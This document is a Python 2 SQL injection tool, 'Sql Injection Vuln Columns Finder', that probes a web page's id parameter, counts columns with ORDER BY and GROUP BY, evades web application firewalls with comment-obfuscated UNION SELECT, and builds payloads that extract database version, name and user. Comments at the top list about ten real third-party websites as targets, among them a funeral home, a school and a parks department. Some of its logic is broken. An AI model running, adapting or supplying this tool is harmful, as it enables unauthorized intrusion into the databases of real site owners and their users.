#!/usr/bin/env python
# Creator : L0V3R In Myanmar
# Date : 3.3.2016
# Usage : python filename.py -t http://example.com/index.php?id=1
# target = "http://www.dublinsquarepub.com/news.php?id=1"
# target = "http://www.dublinsquarepub.com/news.php?id=1"
# target = 'http://www.cces.com.tw/news.php?id=1'
# target = 'http://www.comtecwash.com/photos.php?id=1'
# target = "http://ptrcmmps.in/photos.php?id=1'"
# target = 'http://www.lampefuneralhome.com/details.php?id=102'
# target = 'http://www.minutemanhq.com/hq/print.php?sid=163'
# target = 'http://www.bransonparksandrecreation.com/park.php?id=1'
# target = "http://www.rootsinternationalschool.com/fapage.php?id=15'"
# target = "http://www.diabor.it/en/new.php?id=6"
# http://www.plantandem.be/home.php?p=g&id=4 # more error show

from urllib2 import urlopen, URLError, HTTPError
from urllib import urlopen 
import sys, urllib,  urllib2, time
import random #for choice random user-agent
import time
import os
import re # to find the column (group_by_method)
from os.path import basename
import httplib, socket
from os.path import basename


version = 1.5

red = "\033[1;31m"
green = "\033[1;39m"
greenlow = "\033[1;32m"
yellow = "\033[1;33m"
normal = "\033[0m"
white = "\033[0;37m"



your_query = "concat(0x%s,0x%s,%s,0x%s,version(),0x%s,database(),0x%s,user())"% ("<br><br><font color=green name='Open Sans'> >>> Injected By L0V3R <<< ( ".encode('hex'),basename(sys.argv[0]).encode('hex'), '0x'+(' ( Version : '+str(version)+')').encode('hex'),' )<br><br><font color=red>Version >>> '.encode('hex'),"<br>DB >>> ".encode('hex'),'<br>User >>> '.encode('hex'))

useragent_list = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
	"Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1",
	"Mozilla/5.0 (X11; Linux x86_64; rv:22.0) Gecko/20100101 Firefox/22.0 Iceweasel/22.0",
	"Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1",
	"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16"]

def showlogo():
		# '''
		#       ______          __           ____                  __                 
		#      / ____/___  ____/ /__        / __ )________  ____ _/ /_____  __________
		#     / /   / __ \/ __  / _ \______/ __  / ___/ _ \/ __ `/ //_/ _ \/ ___/ ___/
		#    / /___/ /_/ / /_/ /  __/_____/ /_/ / /  /  __/ /_/ / ,< /  __/ /  (__  ) 
		#    \____/\____/\__,_/\___/     /_____/_/   \___/\__,_/_/|_|\___/_/  /____/  

		# '''
	print '''%s
	  _   _   _   _   _   _   _   _   _   _ 
	 / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ 
	( v | u | l | n | e | r | a | b | l | e )
	 \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ 
	  _   _   _   _   _   _   _ 
	 / \ / \ / \ / \ / \ / \ / \ 
	( c | o | l | u | m | n | s )
	 \_/ \_/ \_/ \_/ \_/ \_/ \_/
	  _   _   _   _   _   _ 
	 / \ / \ / \ / \ / \ / \ 
	( f | i | n | d | e | r )
	 \_/ \_/ \_/ \_/ \_/ \_/
	  _   _   _ 
	 / \ / \ / \ 
	((s | q | l)) 
	 \_/ \_/ \_/

	
	Sql Injection Vuln Columns Finder                                                                       
					Creator : L0V3R In Myanmar
					Version : %s
	%s''' % (green, version, normal)
def help():
	print '''   Usage : Menu Banner
	Usage : python %s [OPTION]
	-t \tset the target ( Eg, -t http://target.com/index.php?id=1 )
	-h \tshow this help menu.
	--show  show payload
	(eg, python columnfind.py -t http://target.com/new.php?id=1 --show)
	''' % sys.argv[0]
def getdata(target):
	pass
def sql_error_check(target):
	sql_error_list = [
		'mysql_fetch_assoc()',
		'mysql_fetch_array()',
		'session_start()',
		'Unknown()',
		'mysql_result()',
		'mysql_num_rows()',
		'mysql_query()',
		'Error Occurred While Processing Request',
		"Error Occured While Processing Request",
		'Server Error',
		'Microsoft OLE DB Provider for ODBC Drivers error',
		'error in your SQL syntax',
		'VBScript Runtime',
		'JET Database',
		'Syntax error',
		"Syntax Error",
		'include()',
		'VBScript runtime  error',
		'Invalid Querystring',
		'Input string was not in a correct format',
		"You have an error in your SQL syntax",
		"mysql_numrows()",
		"mysql_fetch",
		"num_rows",
		"Error Executing Database Query",
		"Unclosed quotation mark",
		"Invalid Querystring",
		"GetArray()",
		"FetchRows()",
		"Not found",
		"Fatal error"]

	error_check_sign = [
	"'",
	'"',
	"\\",
	"')",
	'''")''',
	"\\)"]
	error_found = False
	
	target_for_error_check = target 
	for error_test in error_check_sign:
		target_for_error_check = target+error_test
		showinfo("Checking The Target with the sql error sign : ",error_test)
		print "[%s] [%s!%s] >>> " %(time.strftime("%H:%M:%S"),yellow,normal), target + yellow + error_test + normal
		getpage = urllib2.urlopen(target_for_error_check).read()
		for errormsg in sql_error_list:
			if errormsg in getpage:
				error_found = True
				print "[%s] %s[+] >>>  Sql Error Found : %s %s" % (time.strftime("%H:%M:%S"),green, errormsg,normal)
				print ''
				return True
		target_for_error_check = ''
		print ''
	if error_found == False:
		print "[%s] %s[-] >>>  There is no error message in web page.%s\n%s[%s] %s[-] >>>  Are you want to continue?%s" % (time.strftime("%H:%M:%S"),red,normal,normal, time.strftime("%H:%M:%S"),red,normal)
		y_o = raw_input(time.strftime("%H:%M:%S")+yellow+"[-]>>> Yes or No : "+normal).lower() 
		if y_o == 'y' or y_o == 'yes':
			return True
		else:
			sys.exit(1)
def isonline(target):
	try:
		site = target.replace("http://", "")
		# print site
		site = site.split('/')
		print "[%s] [+] >>>  Checking the target is Online : " % time.strftime("%H:%M:%S") , ("http://"+site[0])
		# print site[0]
		# sys.exit(1)
		conn = httplib.HTTPConnection(site[0])
		conn.connect()
		print "[%s] [+] >>>  Target is Online : " % time.strftime("%H:%M:%S"), ("http://"+site[0])
	except (httplib.HTTPResponse, socket.gaierror , socket.error) as e:
		print e
		sys.exit(1)

def find_Unknown_column(target_read,end_url):
	if "'order by 111111111111-- --')" in target_read:
		print ''
		showerror("Error Found : 'order by 111111111111-- --')")
		return find_columns(target,end_url+')')

	if "Unknown column '111111111111' in 'order clause'" in target_read:
		print ''
		showinfo(green+"Error Found : %sUnknown column '111111111111' in 'order clause'"% yellow)
		showinfo("End Url Used : ", red , (end_url=='' and 'blank' or end_url) )
		find_the_column_group_by(target,end_url)
	if normal_page_len > len(target_read):
		print ''
		showerror("[+] >>> It looks like some photos or text.")
		showerror("[!] >>> when testing in end_url : %s" % (end_url=='' and 'blank' or end_url))
		find_the_column_group_by(target,end_url)
	if normal_page_len < len(target_read):
		print ''
		showerror("More Error Found!")
		find_the_column_group_by(target,end_url)

def find_the_column_group_by(target,end_url='--'):
	sys.stdout.write("[%s] [+] >>>  Finding Columns By Using Group Method : " % time.strftime("%H:%M:%S"))
	group_by = "+GROUP+BY+"+','.join([str(i) for i in range(1,101)])+end_url
	final_url_group_by = target+group_by
	data = urllib2.urlopen(final_url_group_by).read()
	pa = re.compile(r"Unknown column '(\d+)' in 'group statement'")
	if len(pa.findall(data)) != 0:
		sys.stdout.write(greenlow+" Found"+normal)
		sys.stdout.flush()
		number_of_column = int(pa.findall(data)[0]) - 1
		# print '\nColumns found : %d' % number_of_column
		print ''
		showinfo("Columns found : ",number_of_column)
		find_columns(target,end_url,number_of_column)
		sys.exit(1)
	else:
		sys.stdout.write(red+" Failed."+normal)
		sys.stdout.flush()
		print ''
		find_columns(target,end_url)
	sys.exit(1)
def check_end_url(target):
	global end_url
	global normal_page_len
	end_url = False
	sys.stdout.write("[%s] [*] >>>  Connecting The Target . . ."% time.strftime("%H:%M:%S"))
	sys.stdout.flush()
	#try to connect to read normal page len
	normal_page = urllib2.urlopen(target)
	#Done
	sys.stdout.write(" :" + green + " Done"+ normal+'\n')
	sys.stdout.flush()
	normal_page_len = len(normal_page.read())
	showinfo("Normal Page Len : " , red ,normal_page_len , "Words")

	unknown_check = {
	'1--':"+order+by+111111111111",
	"2--+--":"'+order+by+111111111111",
	'3-- --':"'+order+by+111111111111",
	'4#':"+order+by+111111111111", 
	'5%20':"+order+by+111111111111", 
	'6`':"+order+by+111111111111",
	"7--":")+order+by+111111111111",
	"8--+--)":"')+order+by+111111111111",
	"9--+--D)":'''")+order+by+111111111111'''
	}

	for end_url,order_check in sorted(unknown_check.items(),reverse=False):
		tar = target+order_check
		print ''
		# print '\n',tar+end_url[1:],'\n'
		sys.stdout.write("[%s] [~] >>>  " % time.strftime("%H:%M:%S"))
		sys.stdout.write(tar+end_url[1:])
		tar_read = urllib2.urlopen(tar+end_url[1:]).read()
		tar_len = len(tar_read)
		sys.stdout.flush()
		# time.sleep(2)
		sys.stdout.write(" %s %s %s %s" % (red,tar_len , "Words",normal))
		sys.stdout.flush()
		# print tar_read
		find_Unknown_column(tar_read,end_url[1:])
	if end_url == False:
		print red + "[!]>>> There Is nothing to use end url" + normal
		y_o = raw_input('Are You Sure wnat to continue?(y/n)').lower()
		y_o = 'y' or 'yes' and find_Unknown_column(tar_read,end_url[1:])
		sys.exit(1)
	sys.exit(1)
	
def payload(var1,text,var2,patten=False):
	if not patten:
		return '0x'+var1.encode('hex')+','+text+','+'0x'+var2.encode('hex')
	else: return var1+text+var2
def writelog(target):
	filename = sys.argv[0].replace(basename(sys.argv[0]), '')+'column_found.txt' 
	with open(filename , 'a') as file:
		file.write(target)
		file.write('\n')
		file.close()
def showtime(text):
	# , [*] Started Time %s time.strftime("%H:%M:%S")
	print "[" + yellow+str("*")+normal+"] >>> "+ greenlow + text + normal + "[" + time.strftime("%H:%M:%S")+"]"
def showinfo(text,var1='',var2='',var3='',var4='',number=str('+')):
	# print ''
	print "[" + time.strftime("%H:%M:%S") +"] [" + yellow + str(number) + normal + "] >>> " , green + str(text) , str(var1) , str(var2) , str(var3) +str(var4) + normal
def showwarning(text,var1='',var2='',var3=''):
	# print ''
	print "[" + time.strftime("%H:%M:%S") + "] [" + red + str("-") + normal + "] >>> " , red + str(text) , str(var1) , str(var2) , str(var3) + normal
def showerror(text,var1='',var2='',var3='',var4=''):
	# print ''
	print "[" + time.strftime("%H:%M:%S") +"] [" + red + str("+") + normal + "] >>> " , yellow + str(text) , str(var1) , str(var2) , str(var3) +str(var4) + normal
def find_columns(target,end_url= '--',number_of_column=''):
	if number_of_column == '':
		number_of_column = 1
	union_select = "+AND+0+UNION+SELECT+"
	
	find_message = "0x"+"MY@NM@R".encode('hex') # Do not change!
	column_insert = ','
	if end_url == '--+--' or end_url == '-- --':
		target = target+"'"
		# finding_url = target+"'"+union_select+find_message
	if end_url == '--+--)':
		target = target+"')"
	if end_url == '--+--D)':
		target = target+'''")'''
	# showinfo("Checking WAF . . . ")
	sys.stdout.write("[%s] [%s+%s] >>>  %sChecking WAF . . . %s" % (time.strftime("%H:%M:%S"),yellow,normal,green,normal))
	waf_bypass=False
	while waf_bypass==False:
		try:
			getdata = urllib2.urlopen(target+union_select+str(','.join([str(i) for i in range(1,number_of_column+1)]))+end_url).read()
			if "Illegal Operation" in getdata:
				# if show: print getdata
				showerror("WAF Found!(Illegal Operation)")
				# union_select = "%A0And%A0UNION%A0SELCT%A0"
				union_select = "+AND+0%2f*!50000UNION*%2f+%2f*!50000SELECT*%2f+"
				waf_bypass = False
			# elif "<title>403 Forbidden</title>".lower() in re.findall(r"<title>(.+)</title>", getdata , re.IGNORECASE)[0].lower():
			elif "<title>403 Forbidden</title>".lower() in getdata.lower():
				# if show: print getdata
				showerror("403 WAF Found!")
				union_select = "+And+/*!50000Union*/+/*!50000Select*/+"
				waf_bypass=False
			# elif "<title>412 Error</title>".lower() in re.findall(r"<title>(.+)</title>", getdata , re.IGNORECASE)[0].lower():
			elif "<title>412 Error</title>".lower() in getdata.lower():
				# if show: print getdata
				# showerror("%s WAF Found" % re.findall(r"<title>(.+)</title>", getdata , re.IGNORECASE)[0])
				showerror("%s WAF Found! (412 Error) ")
				union_select = "%A0AND%A0%UNION%A0SELECT%A0"
				waf_bypass=False
			elif "Not Acceptable!" in getdata:
				# if show: print getdata
				# print '\nSir, I can\'t bypass WAF!'
				showerror('Sir, I can\'t bypass WAF!Not Acceptable!')
				union_select = "+AND+0/*!50000UNION*/+SELECT+"
				# union_select = "+AND+'1'='2'+/*!50000UNION*/+SELECT+"
				waf_bypass=False
			else:
				# showerror("WAF NOT FOUND!")
				sys.stdout.write(" : WAF NOT FOUND!")
				sys.stdout.flush()
				waf_bypass=True
				# if show: print ''
				# if show: print getdata

		except HTTPError , e:
			showwarning("WAF FOUND", e.reason)
			if e.reason == "Not Acceptable":
				union_select = "+AND+0/*!50000UNION*/+SELECT+"
				showerror("Try to bypass with /*!50000string*/")
			if e.reason == "ModSecurity Action":
				# if "%20UNION%20SELECT%20" in getdata:
				# 	print "SPACE WAF FOUND!"
				# 	sys.exit(1)
				print "ModSecurity Action"
				sys.exit(1)
			else:
				# showerror("WAF NOT FOUND!")
				sys.stdout.write("\nWAF Bypassed!")
				sys.stdout.flush()
				waf_bypass=True
			waf_bypass = True
		except IndexError:

			showwarning("There is no title!")
			waf_bypass=True

	# for found_columns
	global vuln_column
	if number_of_column != 1:
		find_vuln_colunms = target+union_select+','.join([(find_message+str(i*111111).encode('hex')) for i in range(1,number_of_column+1)])+end_url
		print ''
		showinfo(greenlow+"Finding The Vuln Column Numbers . . .")
		
		if show: print '\n', target+union_select+','.join([str(i) for i in range(1,number_of_column+1)])+end_url
		if show: print '\n' , find_vuln_colunms
		getdata = urllib2.urlopen(find_vuln_colunms).read()
		pa = r"MY@NM@R(\d+)"
		if len(re.findall(pa, getdata)) != 0:
			# print 'work'
			vuln_column = []
			vuln_column_tmp = ''.join([str((int(i)/111111)) for i in re.findall(pa, getdata)])
			vuln_column = sorted(vuln_column_tmp.replace(" ", ''))
			
			# to remove same number because if show vuln number in webpage in twice
			for i in vuln_column_tmp:
				if i not in vuln_column:
					vuln_column.append(i)
			showinfo("Found vulnerable column are : " , ' '.join([str(i) for i in vuln_column]))	
			sys.exit(1)
			# end #
		else:
			showwarning(("NOT FOUND VULN COLUMNS By Using auto method".title()))
			if show: print getdata
			if number_of_column == '':
				number_of_column = 1
			else:
				number_of_column = 1
			# print len(vuln_column)
			# print sorted(vuln_column.replace(" ", ''))
		# else:
		# 	print 'not'
		# sys.exit(1)
		# finished


	finding_url = target+union_select+find_message
	
	for_finding_columns = target+union_select+str(number_of_column * 111111)
	
	for_union_select = target+union_select+str(number_of_column)

	# print "Finding The Column Numbers in ", target
	print ''
	showinfo(normal+"Finding The Column Numbers . . . ")
	show==False and (sys.stdout.write("[%s] [~] >>>  Guessing Columns : " % time.strftime("%H:%M:%S")))
	for i in range(number_of_column, 151): # only find the max columns 150 but you can change 150 to 9999
		final_url = finding_url+end_url

		if show:
			# print "Testing . . . %s" % i
			showinfo("Testing . . . %s\n\n%s%s\n" % (i,normal,final_url) )
		else:
		# time.sleep(0.5)
			sys.stdout.write("%s " % i)
			sys.stdout.flush()
		# print final_url
		getdata = urllib.urlopen(final_url).read()
		
		if "MY@NM@R" in getdata:
			# print "The Correct Numbers : Found!"
			print ''
			showinfo("The Correct Column Numbers : Found!")
			# print "Number of Columns" , number_of_column
			showinfo("Number of Columns",red,number_of_column)
			showerror("Want to find vulnerable column numbers? ")
			y_o=False
			while y_o==False:
				y_o = raw_input(yellow+'(y or n) : '+normal).lower()
				if y_o == 'y' or y_o == 'yes' :
					# print "Final url" , final_url
					
					for_finding_columns = for_finding_columns+end_url
					# print for_finding_columns
					if show: print target+union_select+','.join([str(i) for i in range(1,number_of_column+1)])+end_url



					find_vuln_colunms = target+union_select+','.join([(find_message+str(i*111111).encode('hex')) for i in range(1,number_of_column+1)])+end_url
					if show: print find_vuln_colunms
					print ''

					showinfo(greenlow+"Finding The Vuln Column Numbers . . .")
					getdata = urllib2.urlopen(find_vuln_colunms).read()
					pa = r"MY@NM@R(\d+)"
					if len(re.findall(pa, getdata)) != 0:
						# print 'work'
						vuln_column = []
						vuln_column_tmp = ''.join([str((int(i)/111111)) for i in re.findall(pa, getdata)])
						vuln_column = sorted(vuln_column_tmp.replace(" ", ''))
						
						for i in vuln_column_tmp:
							if i not in vuln_column:
								vuln_column.append(i)

						showinfo("Found vulnerable column are : " , ' '.join([str(i) for i in vuln_column]))
					else:
						vuln_column = []
						# vuln_payload = []
						final = target+union_select+','.join[(str(find_message+str(i)) for i in range(number_of_column+1))]
						getdata = urllib.urlopen(final).read()
						for i in (str(find_message+str(i)) for i in range(number_of_column+1)):
							if i in getdata:
								print "Found Vulnerable Column is : " , i
								if show: print "Payload : " , target+union_select+(','+','.join([str(c) for c in range(1,number_of_column+1)])+',').replace(",%s,"% i, ',%s,'% your_query)[1:-1]+end_url
								vuln_column.append(i)
					
				elif y_o == 'n' or y_o == 'no':
					for_finding_columns = for_finding_columns+end_url
					print "\n[+]>>> Payload >>>" , for_finding_columns
					mau_query = for_union_select+end_url
					print "[+]>>> Manual Query : " , mau_query
					print "\n[+]>>> Have A Nice Day (Y)" 
					print "[*] Exiting . . . ", time.strftime("%H:%M:%S")

				else:
					y_o=False
			findpayload = str(target)+str(union_select)+str(',')+str(','.join([str(i) for i in range(1,int(number_of_column)+1)]))+str(',')+str(end_url)

			sys.exit(1)

		number_of_column += 1
		#to find the colunm numbers
		finding_url += column_insert
		#for add message
		finding_url += find_message 
		
		#to find the vuln numbers
		for_finding_columns += column_insert
		#to add columns
		for_finding_columns += str(number_of_column * 111111)

		#to add columns for 1,2,3
		for_union_select += column_insert
		for_union_select += str(number_of_column)
	sys.exit(1)


if __name__ == '__main__':
	if len(sys.argv) <= 1 or '-h' in sys.argv:
		showlogo()
		help()
		exit()
	if '-t' or '-help' or '--help' in sys.argv[1]:
		try:
			show = False
			target = sys.argv[2]
			showlogo()
			showtime("Starting Time at ")
			if '--show' in sys.argv:
				show = True
				showinfo("Show Payload : True")
			if not 'http://' in target:
				target = str("http://")+target
			print ''
			isonline(target)
			sql_error_check(target)
			check_end_url(target)
			find_the_column_group_by(target)
			find_columns(target,end_url,number_of_column=11)
			find_data(target,union_select,number_of_column,end_url)
		except HTTPError, e:
			# print "\nHTTPError found.", e
			showwarning("HTTPError Found : ",e.reason)
		except URLError, e:
			showwarning("URLError Found : %s"% e.reason )
		except IndexError, e:
			print e
			showlogo()
			help()
			sys.exit(1)
		except KeyboardInterrupt , e:
			# print red + "\n[-]>>> KeyboardInterrupt" + normal
			print ''
			showwarning("KeyboardInterrupt Dected.")
			showwarning('Exiting . . . ')
			sys.exit(1) 

'''
>>> Process <<<
1) show logo :P
2) check the target site is online
3) check the sql error when testing sql error sign (',",etc . . .)
4) check the end_url (--,--+--,-- --, etc . . . )
5) find the column using method with group by mwthod
6) find_columns
7) show vuln columns
8) find banner
9) exit :P
'''